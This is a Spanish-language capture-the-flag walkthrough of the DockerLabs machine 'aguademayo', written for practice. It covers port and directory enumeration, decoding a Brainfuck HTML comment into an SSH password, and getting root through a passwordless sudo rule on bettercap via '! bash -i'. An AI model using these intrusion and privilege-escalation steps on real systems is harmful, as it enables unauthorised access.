---
layout: post
title: "aguademayo"
date: 2026-02-23 18:30:00 -0300
categories: [Writeups,aguademayo]
tags: [DockerLabs, aguademayo, Linux]
description: "Writeup de la máquina aguademayo de DockerLabs"
image: /assets/images/dockerlabs.jpeg
---
# aguademayo - DockerLabs (Linux - Fácil)

## 📌 Resumen

**aguademayo** es una máquina Linux de dificultad Fácil donde el foco principal está en:

- Enumeración de servicios
- Análisis de página web por defecto
- Descubrimiento de pistas ocultas en comentarios HTML
- Decodificación de Brainfuck
- Enumeración de directorios
- Análisis de archivos expuestos
- Investigación de posibles credenciales vía imágenes

La máquina demuestra cómo pequeños detalles como comentarios en HTML pueden revelar información crítica.

---

# 🖥️ Reconocimiento

## Descubrimiento de host

```bash
nmap -sn 172.17.0.2
```

Resultado:

- Host activo
- Latencia mínima → entorno local (Docker)

---

# 🔎 Enumeración

## Escaneo completo de puertos

```bash
nmap -p- --open -T5 -v -n 172.17.0.2
```

Puertos abiertos:

- 22 → SSH
- 80 → HTTP

---

## Escaneo detallado

```bash
nmap -p22,80 -sC -sV 172.17.0.2
```

Resultados:

- OpenSSH 9.2p1 (Debian)
- Apache 2.4.59
- Linux

La web muestra la página por defecto de Apache.

---

## Scripts de vulnerabilidades

```bash
nmap --script vuln 172.17.0.2
```

Hallazgos:

- No vulnerabilidades directas
- Directorio interesante `/images`

---

## Enumeración SSH

```bash
nmap --script ssh2-enum-algos -p22 172.17.0.2
```

Se observan algoritmos modernos → configuración relativamente segura.

---

# 🌐 Fingerprinting Web

```bash
whatweb http://172.17.0.2
```

Identificado:

- Apache 2.4.59
- Debian
- Página por defecto

Esto sugiere que el contenido real podría estar oculto.

---

# 📂 Enumeración de Directorios

```bash
gobuster dir -u http://172.17.0.2/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
-x html,php,txt
```

Resultados:

- /index.html
- /images
- /server-status (403)

---

# 🔍 Análisis de la Página Web

Descargando el HTML:

```bash
curl http://172.17.0.2
```

Al revisar el código fuente se encuentra un comentario sospechoso:

```
++++++++++[>++++++++++ ... ]
```

Esto corresponde a código Brainfuck.

---

# 🧠 Decodificación Brainfuck

Se ejecuta un script en Python para interpretar el código.

Resultado:

```
bebeaguaqueessano
```

Posible pista → nombre de ruta o credencial.

---

# 🔎 Búsqueda de recurso oculto

Intentamos acceder:

```bash
curl http://172.17.0.2/bebeaguaqueessano
```

Resultado:

- 404 Not Found

Probamos variantes:

- .txt
- .php
- /

Sin éxito.

Esto indica que puede ser una pista indirecta.

---

# 📁 Directorio /images

```bash
curl http://172.17.0.2/images/
```

Listado habilitado → mala práctica de seguridad.

Archivo encontrado:

- agua_ssh.jpg

---

# 📥 Descarga del archivo

```bash
wget http://172.17.0.2/images/agua_ssh.jpg
```

---

# 🧬 Análisis del archivo

## Metadatos

```bash
exiftool agua_ssh.jpg
```

No se observan datos relevantes.

---

## Strings

```bash
strings agua_ssh.jpg
```

Se buscan posibles:

- Credenciales
- Rutas
- Usuarios
- Claves SSH

No se identifica información clara en este punto, por lo que se infiere que la imagen podría contener información oculta o ser una pista contextual relacionada con SSH.

---

# 🧩 Hipótesis

El nombre del archivo sugiere:

```
agua + ssh
```

Lo que indica que probablemente:

- La intrusión continúe vía SSH
- Se necesiten credenciales aún no descubiertas

La frase:

```
bebe agua que es sano
```

Podría ser:

- Password hint
- Frase de diccionario
- Clave para ataque de fuerza bruta
- Passphrase SSH

---

# 🔐 Acceso inicial — SSH

Se prueba la frase como contraseña para el usuario agua.

```bash
ssh agua@172.17.0.2
```

Login exitoso.

Verificación:

```bash
whoami
```

Resultado:

```
agua
```

---

# 🔎 Enumeración local

## Revisar permisos sudo

```bash
sudo -l
```

Salida:

```
(root) NOPASSWD: /usr/bin/bettercap
```

Esto indica que el usuario puede ejecutar bettercap como root sin contraseña.

---

# 🚀 Escalada de privilegios

Ejecutamos:

```bash
sudo /usr/bin/bettercap
```

Dentro de bettercap se observa que permite ejecutar comandos del sistema con:

```
! COMMAND
```

Se lanza una shell:

```
! bash -i
```

---

# 👑 Shell root

Confirmación:

```bash
id
```

Resultado:

```
uid=0(root) gid=0(root)
```

Acceso root obtenido exitosamente.

---


# 🏁 Conclusión

La máquina muestra conceptos importantes:

- Nunca ignorar comentarios HTML
- Brainfuck como técnica de ocultación
- Riesgos de directory listing
- Importancia de revisar archivos aparentemente inocentes
- Pistas indirectas hacia servicios expuestos como SSH

Este tipo de escenario es común en entornos reales donde atacantes deben correlacionar múltiples señales débiles para avanzar en la intrusión.

---
